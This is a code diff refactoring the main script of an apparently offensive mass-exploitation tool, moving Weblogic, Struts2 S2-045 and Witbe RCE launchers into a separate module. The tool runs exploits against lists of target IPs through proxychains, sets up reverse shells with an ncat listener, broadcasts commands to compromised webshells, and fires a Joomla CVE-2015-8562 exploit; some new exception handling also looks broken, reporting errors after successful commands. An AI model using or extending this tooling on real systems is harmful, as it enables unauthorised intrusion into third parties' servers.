@@ -10,6 +10,8 @@ import util.console as console
 import util.colors as colors
 import util.webshell as ws
 import util.baidu as baidu
+import util.exploits as ExecExp
+from util.console import input_check
 
 # mark home for our way back
 init_dir = os.getcwd()
@@ -27,32 +29,6 @@ def debug_except():
         console.print_error(str(tb))
 
 
-def input_check(prompt, type=None, choices=None):
-    while True:
-        user_input = str(
-            input(
-                colors.BLUE +
-                prompt +
-                colors.END)).strip(
-        ).lower(
-        )
-        try:
-            if choices is not None:
-                if user_input not in choices:
-                    console.print_error("[-] Invalid input")
-                    continue
-                if type is None:
-                    return user_input
-                return str(type(user_input))
-            elif type is not None and choices is None:
-                return str(type(user_input))
-            else:
-                return user_input
-        except:
-            console.print_error("[-] Invalid input")
-            continue
-
-
 # kill process by name
 def check_kill_process(pstring):
     for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
@@ -65,16 +41,16 @@ def list_exp():
     def is_executable(path):
         return os.path.isfile(path) and os.access(path, os.X_OK)
 
-    for root, dirs, files in os.walk('exploits'):
+    for root, _, files in os.walk('exploits'):
         paths = []
-        for f in files:
-            path = './' + root + '/' + f
+        for filename in files:
+            path = './' + root + '/' + filename
             paths.append(path)
-        for p in paths:
-            poc = '/'.join(p.split('/')[2:])
-            if len(p.split('/')) > 4:
+        for pathname in paths:
+            poc = '/'.join(pathname.split('/')[2:])
+            if len(pathname.split('/')) > 4:
                 continue
-            if is_executable(p):
+            if is_executable(pathname):
                 print(colors.BLUE + poc + colors.END)
 
 
@@ -88,9 +64,9 @@ def jexboss(cmd, exploit_path):
                              proxy_conf, exploit_path] + args)
         except BaseException:
             subprocess.call(['python', exploit_path, '-h'])
-    except Exception as e:
+    except BaseException as err:
         console.print_error(
-            "[-] Error starting {}: ".format(exploit_path) + str(e))
+            "[-] Error starting {}: ".format(exploit_path) + str(err))
         debug_except()
 
 
@@ -123,8 +99,8 @@ def execute(cmd):
             os.chdir('output')
             print(colors.PURPLE + '[*] Searching on Baidu...' + colors.END)
             baidu.spider(dork, count)
-        except Exception as e:
-            console.print_error('[-] Error with baidu: ' + str(e))
+        except BaseException as err:
+            console.print_error('[-] Error with baidu: ' + str(err))
             debug_except()
     elif cmd == 'proxy':
         if not os.path.exists('data/ss.json'):
@@ -134,9 +110,9 @@ def execute(cmd):
                              stderr=subprocess.PIPE,
                              stdout=subprocess.PIPE,
                              shell=False)
-        except Exception as e:
+        except BaseException as err:
             console.print_error(
-                '[-] Error starting Shadowsocks proxy: ' + str(e))
+                '[-] Error starting Shadowsocks proxy: ' + str(err))
             debug_except()
     elif cmd.startswith('webshell'):
         try:
@@ -146,9 +122,9 @@ def execute(cmd):
                     ws.loadShells('webshell.list')
                     cmd = input(colors.CYAN + 'CMD >> ' + colors.END)
                     ws.broadcast(cmd)
-                except Exception as e:
+                except BaseException as err:
                     console.print_error(
-                        '[-] Error with webshell broadcasting: ' + str(e))
+                        '[-] Error with webshell broadcasting: ' + str(err))
                     debug_except()
             else:
                 pass
@@ -158,8 +134,8 @@ def execute(cmd):
                     ws.loadShells('webshell.list')
                     shell = input('[*] Select a shell: ').strip()
                     ws.ctrl(shell)
-                except Exception as e:
-                    console.print_error('[-] Error with webshell: ' + str(e))
+                except BaseException as err:
+                    console.print_error('[-] Error with webshell: ' + str(err))
                     debug_except()
     elif cmd == 'redis':
         answ = input(
@@ -177,18 +153,16 @@ def execute(cmd):
             # well yes im a lazy guy
             subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                              '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
-            pass
-        except Exception as e:
-            console.print_error(e)
+        except BaseException as err:
+            console.print_error(str(err))
             debug_except()
     elif cmd.startswith('jexboss'):
         jexboss(cmd, './exploits/jexboss/jexboss.py')
     elif cmd == 'q' or cmd == 'quit':
         check_kill_process('ss-proxy')
-        print("[+] Exiting...")
         sys.exit(0)
     elif cmd == 'h' or cmd == 'help' or cmd == '?':
-        print(console.help)
+        print(console.help_info)
     elif cmd == 'exploits':
         print(colors.CYAN + '[+] Available exploits: ' + colors.END)
         list_exp()
@@ -196,8 +170,8 @@ def execute(cmd):
         try:
             os.chdir('./zoomeye')
             subprocess.call(['python', 'zoomeye.py'])
-        except Exception as e:
-            console.print_error('[-] Cannot start zoomeye.py:\n' + str(e))
+        except BaseException as err:
+            console.print_error('[-] Cannot start zoomeye.py:\n' + str(err))
             debug_except()
     elif cmd == 'x' or cmd == 'clear':
         subprocess.call("clear")
@@ -217,132 +191,15 @@ def execute(cmd):
                 colors.END +
                 '\n')
             os.system(cmd)
-        except Exception as e:
+        except BaseException as err:
             console.print_error(
-                "[-] Error executing shell command `{}`: ".format(cmd) + str(e))
+                "[-] Error executing shell command `{}`: ".format(cmd) + str(err))
             debug_except()
-
-
-# gonna use this in our exploiter
-scanner_args = []
-
-
-def weblogic():
-    print(colors.BLUE + '\n[*] Welcome to Weblogic exploit' + colors.END)
-    '''
-    server_port = input(
-        colors.BLUE +
-        '[?] What\'s the port of Weblogic server? ' +
-        colors.END)
-    '''
-    server_port = input_check(
-        "[?] What's the port of shell server? ",
-        type=int)
-    os_type = input_check('[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
-    if input_check('[?] Do you need a reverse shell? [y/n] ', choices=['y', 'n']) == 'y':
-        shellServer = input_check('[?] What\'s the IP of shell receiver? ')
-        port = input_check(
-            '[?] What\'s the port of shell receiver? ',
-            type=int)
-        if os_type.lower() == 'w':
-            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os win'.format(
-                shellServer, port, server_port).split()
-        elif os_type.lower() == 'l':
-            custom_args = '-l {} -p {} -P {} --silent -T reverse_shell -os linux'.format(
-                shellServer, port, server_port).split()
-        else:
-            console.print_error('[-] Invalid input')
-            return
-    else:
-        cmd = str(
-            input(colors.BLUE +
-                  '[?] What command do you want to execute on the target? ' +
-                  colors.END)).strip(
-        )
-        if os_type.lower() == 'w':
-            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
-                server_port, cmd)
-        elif os_type.lower() == 'l':
-            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
-                server_port, cmd)
-        else:
-            return
-
-    # start scanner
-    exploit = 'weblogic.py'
-    work_path = '/weblogic/'
-    exec_path = exploit
-    jobs = 100
-    # waitTime = 25  # deprecated
-    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
-    scanner(scanner_args)
-
-
-# currently not available
-def redis():
-    print(colors.BLUE + '\n[*] Welcome to Redis exploit' + colors.END)
-    answ = input_check(
-        '[*] Executing redis mass exploit against ./exploits/redis/targets, proceed? [y/n] ', choices=['y', 'n'])
-    os.chdir('./exploits/redis/')
-    if answ.lower() == 'y':
-        subprocess.call(['proxychains4', '-q', '-f',
-                         proxy_conf, 'python', 'massAttack.py'])
-    else:
-        pass
-
-
-def s2_045():
-    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
-    port = input_check(
-        '[?] What\'s the port of your target server? ',
-        type=int)
-
-    # args list
-    exploit = 's2_045_cmd.py'
-    work_path = '/structs2/'
-    exec_path = exploit
-    custom_args = str('-p ' + port).split()
-    jobs = 100
-
-    print(
-        colors.BLUE +
-        '[*] Your exploit will be executed like\n' +
-        colors.END,
-        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
-        ' '.join(custom_args))
-    # start scanner
-    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
-    scanner(scanner_args)
-
-
-def witbe():
-    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)
-
-    # shell server config
-    rhost = input_check('[?] IP of your shell server: ')
-    rport = input_check('[?] and Port? ', type=int)
-
-    # exploit config
-    exploit = 'witbe.py'
-    work_path = '/witbe/'
-    exec_path = exploit
-    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
-    jobs = 50
-    print(
-        colors.BLUE +
-        '[*] Your exploit will be executed like\n' +
-        colors.END,
-        'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
-        ' '.join(custom_args))
-    # start scanner
-    scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
-    scanner(scanner_args)
 
 
 def attack():
     global proxy_conf
     global proxy
-    global scanner_args
     if input_check('[?] Do you wish to use proxychains? [y/n] ', choices=['y', 'n']) == 'y':
         proxy = True
     else:
@@ -359,22 +216,22 @@ def attack():
         print(console.built_in)
         answ = input_check(
             '[=] Your choice: ',
-            type=int,
+            check_type=int,
             choices=['0',
                      '1',
                      '2',
                      '3',
                      '4'])
         if answ == '2':
-            redis()
+            console.print_error("\n[-] Under development")
         elif answ == '1':
             console.print_error('\n[-] Under development')
         elif answ == '0':
-            weblogic()
+            scanner(ExecExp.weblogic())
         elif answ == '3':
-            s2_045()
+            scanner(ExecExp.s2_045())
         elif answ == '4':
-            witbe()
+            scanner(ExecExp.witbe())
         else:
             console.print_error('\n[-] Invalid input!')
     elif answ == 'm':
@@ -388,7 +245,8 @@ def attack():
         list_exp()
         exploit = input(
             "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ").strip()
-        jobs = int(input_check("[?] How many processes each time? ", type=int))
+        jobs = int(
+            input_check("[?] How many processes each time? ", check_type=int))
         custom_args = []
         answ = input_check(
             "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
@@ -397,14 +255,14 @@ def attack():
                 "[*] Where do you want me to send shells? ").strip()
             lport = input_check(
                 "[*] and at what port? (make sure you have access to that port) ",
-                type=int)
+                check_type=int)
             custom_args = ['-l', lhost, '-p', lport]
             answ = input_check(
                 '[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
             if answ == 'y':
                 print("\n[*] Spawning ncat listener in new window...\n")
                 try:
-                    listener = subprocess.Popen(
+                    subprocess.Popen(
                         args=[
                             "gnome-terminal",
                             "--command=ncat -nklvp " +
@@ -428,17 +286,17 @@ def attack():
             "[*] args for this exploit (target IP is handled already) ").strip().split()
         exec_path = exploit.split('/')[1:]
         work_path = exploit.split('/')[:-1]
-        d = '/'
-        exec_path = d.join(exec_path)
-        work_path = d.join(work_path)
-        d = ' '
+        delimtr = '/'
+        exec_path = delimtr.join(exec_path)
+        work_path = delimtr.join(work_path)
+        delimtr = ' '
         print(
             colors.BLUE +
             '[*] Your exploit will be executed like\n' +
             colors.END,
             'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                 exec_path),
-            d.join(custom_args))
+            delimtr.join(custom_args))
         scanner_args = (
             exploit,
             work_path,
@@ -451,9 +309,12 @@ def attack():
 
 
 def scanner(scanner_args):
+    '''
+    Execute exploit against given ip list
+    '''
     global ip_list
     global proxy
-    exploit, work_path, exec_path, custom_args, jobs = scanner_args[
+    _, work_path, exec_path, custom_args, jobs = scanner_args[
         0], scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
     if proxy:
         e_args = [
@@ -468,7 +329,8 @@ def scanner(scanner_args):
     e_args += ['-t']
     f = open(init_dir + '/' + ip_list)
     os.chdir('./exploits/' + work_path)
-    console.print_warning('\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
+    console.print_warning(
+        '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
     time.sleep(3)
     count = 0
@@ -498,7 +360,7 @@ def scanner(scanner_args):
             if count == jobs or count == 0:
                 count = 0
                 rnd += 1
-                out, err = proc.communicate()
+                _, _ = proc.communicate()
                 if proc.returncode is not None:
                     proc.kill()
                 continue
@@ -543,8 +405,11 @@ def main():
                 colors.END)
             try:
                 execute(cmd)
-            except Exception as e:
-                print(colors.RED + "[-] Error with command: ", e, colors.END)
+            except (KeyboardInterrupt, EOFError, SystemExit):
+                sys.exit(0)
+            else:
+                print(
+                    colors.RED + "[-] Error with command: ", colors.END)
                 debug_except()
         except KeyboardInterrupt:
             try:
@@ -554,7 +419,6 @@ def main():
                 check_kill_process('ss-proxy')
                 sys.exit(0)
             if answ.lower() == 'y':
-                print("\n[+] Exiting...")
                 check_kill_process('ss-proxy')
                 sys.exit(0)
             else:
@@ -564,10 +428,10 @@ def main():
 if __name__ == "__main__":
     try:
         print(console.intro)
-        # console.ConsoleShell().cmdloop()
         main()
-    except Exception as e:
-        console.print_error('[-] Error at main: ' + str(e))
-        debug_except()
-    except KeyboardInterrupt:
+    except (EOFError, KeyboardInterrupt, SystemExit):
         console.print_error('[-] Exiting...')
+    else:
+        console.print_error(
+            "[-] Seems like you\'ve encountered an unhandled exception")
+        debug_except()
